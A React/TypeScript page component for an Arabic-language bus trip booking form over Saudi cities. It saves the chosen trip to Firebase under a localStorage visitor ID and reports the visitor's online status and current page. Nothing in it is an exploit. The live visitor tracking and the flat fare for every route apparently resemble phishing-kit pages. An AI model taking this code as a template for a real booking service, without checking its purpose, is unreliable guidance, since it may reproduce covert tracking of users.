import { useState, useEffect } from "react";
import { Bus, Check } from "lucide-react";
import { useLocation } from "wouter";
import { BottomNav } from "./services";
import { addData, handleCurrentPage } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import SiteHeader from "@/components/site-header";
import SiteFooter from "@/components/site-footer";

const TICKET_PRICE = 50;

const stations = [
  "الرياض",
  "جدة",
  "مكة المكرمة",
  "المدينة المنورة",
  "الدمام",
  "أبها",
  "تبوك",
  "حائل",
  "القصيم",
];

export default function TripBooking() {
  const [, setLocation] = useLocation();
  const [tripType, setTripType] = useState<"one" | "round">("one");
  const [from, setFrom] = useState("");
  const [to, setTo] = useState("");
  const [date, setDate] = useState("");
  const [promoCode, setPromoCode] = useState("");
  const [passengers] = useState({ adults: 1, children: 0, infants: 0 });
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    const vid = localStorage.getItem("visitor");
    if (vid) {
      setupOnlineStatus(vid);
      void handleCurrentPage("trip_booking");
    }
  }, []);

  const handleSearch = async () => {
    if (submitting) return;
    setError("");
    if (!from || !to || !date) {
      setError("يرجى اختيار محطة الذهاب والوصول والتاريخ");
      return;
    }
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setLocation("/register");
      return;
    }
    setSubmitting(true);
    const totalPassengers =
      passengers.adults + passengers.children + passengers.infants;
    const ok = await addData({
      id: visitorId,
      currentPage: "booking",
      tripFrom: from,
      tripTo: to,
      tripType,
      promoCode,
      ticketQuantity: totalPassengers,
      ticketPrice: TICKET_PRICE,
      totalAmount: totalPassengers * TICKET_PRICE,
      bookingDate: date,
      bookingTime: "—",
    });
    if (!ok) {
      setError("تعذر إكمال الحجز، يرجى المحاولة مرة أخرى");
      setSubmitting(false);
      return;
    }
    setLocation("/schedule");
  };

  return (
    <div
      className="min-h-screen bg-background flex flex-col"
      dir="rtl"
      data-testid="page-trip-booking"
    >
      <SiteHeader />
      <div className="relative h-52 overflow-hidden">
        <div className="absolute inset-0 bg-muted" />
        <div
          className="absolute inset-0 bg-primary"
          style={{ clipPath: "polygon(0 40%, 100% 0, 100% 100%, 0 100%)" }}
        />
        <div className="relative z-10 flex flex-col items-end px-6 pt-10 gap-1">
          <div className="flex items-center gap-3">
            <h1 className="text-xl font-bold text-foreground">إحجز رحلتك</h1>
            <div className="w-10 h-10 rounded-lg bg-card border border-border flex items-center justify-center">
              <Bus className="w-5 h-5 text-primary" />
            </div>
          </div>
          <p className="text-sm text-primary-foreground/90 font-medium">
            البحث عن رحلة
          </p>
        </div>
      </div>

      <div className="flex-1 bg-primary px-6 pt-4 pb-6 flex flex-col gap-4">
        <div className="border-b border-primary-foreground/30 pb-3">
          <select
            value={from}
            onChange={(e) => setFrom(e.target.value)}
            className="w-full bg-transparent text-primary-foreground font-medium text-right text-base focus:outline-none appearance-none cursor-pointer"
            data-testid="select-from"
          >
            <option value="" className="text-foreground bg-background">
              اختر المحطة (من)
            </option>
            {stations.map((s) => (
              <option key={s} value={s} className="text-foreground bg-background">
                {s}
              </option>
            ))}
          </select>
        </div>

        <div className="border-b border-primary-foreground/30 pb-3">
          <select
            value={to}
            onChange={(e) => setTo(e.target.value)}
            className="w-full bg-transparent text-primary-foreground font-medium text-right text-base focus:outline-none appearance-none cursor-pointer"
            data-testid="select-to"
          >
            <option value="" className="text-foreground bg-background">
              اختر المحطة (إلى)
            </option>
            {stations.map((s) => (
              <option key={s} value={s} className="text-foreground bg-background">
                {s}
              </option>
            ))}
          </select>
        </div>

        <div className="border-b border-primary-foreground/30 pb-3">
          <input
            type="text"
            placeholder="ادخل الرمز"
            value={promoCode}
            onChange={(e) => setPromoCode(e.target.value)}
            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/50 text-right text-base focus:outline-none"
            data-testid="input-promo"
          />
        </div>

        <div className="flex items-center justify-end gap-6 py-1">
          <label className="flex items-center gap-2 cursor-pointer">
            <span className="text-primary-foreground text-sm font-medium">
              ذهاب و عودة
            </span>
            <div
              onClick={() => setTripType("round")}
              className={`w-5 h-5 rounded-full border-2 flex items-center justify-center cursor-pointer transition-colors ${
                tripType === "round"
                  ? "border-primary-foreground bg-primary-foreground"
                  : "border-primary-foreground/50 bg-transparent"
              }`}
              data-testid="radio-round"
            />
          </label>
          <label className="flex items-center gap-2 cursor-pointer">
            <span className="text-primary-foreground text-sm font-medium">
              ذهاب فقط
            </span>
            <div
              onClick={() => setTripType("one")}
              className={`w-5 h-5 rounded-full border-2 flex items-center justify-center cursor-pointer transition-colors ${
                tripType === "one"
                  ? "border-primary-foreground bg-primary-foreground"
                  : "border-primary-foreground/50 bg-transparent"
              }`}
              data-testid="radio-one"
            >
              {tripType === "one" && <Check className="w-3 h-3 text-primary" />}
            </div>
          </label>
        </div>

        <div className="bg-card/20 rounded-xl p-4 border border-primary-foreground/20">
          <p className="text-primary-foreground/70 text-xs mb-1">التاريخ</p>
          <input
            type="date"
            value={date}
            onChange={(e) => setDate(e.target.value)}
            placeholder="اختر التاريخ"
            className="w-full bg-transparent text-primary-foreground text-sm focus:outline-none text-right"
            data-testid="input-date"
          />
        </div>

        <div className="bg-card/20 rounded-xl p-4 border border-primary-foreground/20">
          <p className="text-primary-foreground/70 text-xs mb-1">الركاب</p>
          <p className="text-primary-foreground text-sm font-medium text-right">
            الكبار ({passengers.adults})، أطفال ({passengers.children})، الرضع
            ({passengers.infants})
          </p>
        </div>

        {error && (
          <p
            className="text-red-100 bg-red-900/40 rounded-lg px-3 py-2 text-xs text-center"
            data-testid="error-trip-booking"
          >
            {error}
          </p>
        )}

        <button
          onClick={() => void handleSearch()}
          disabled={submitting}
          className="w-full bg-card text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
          data-testid="button-search"
        >
          {submitting ? "جاري الإرسال..." : "البحث"}
        </button>
      </div>

      <SiteFooter />
      <BottomNav active="حجوزاتي" />
    </div>
  );
}
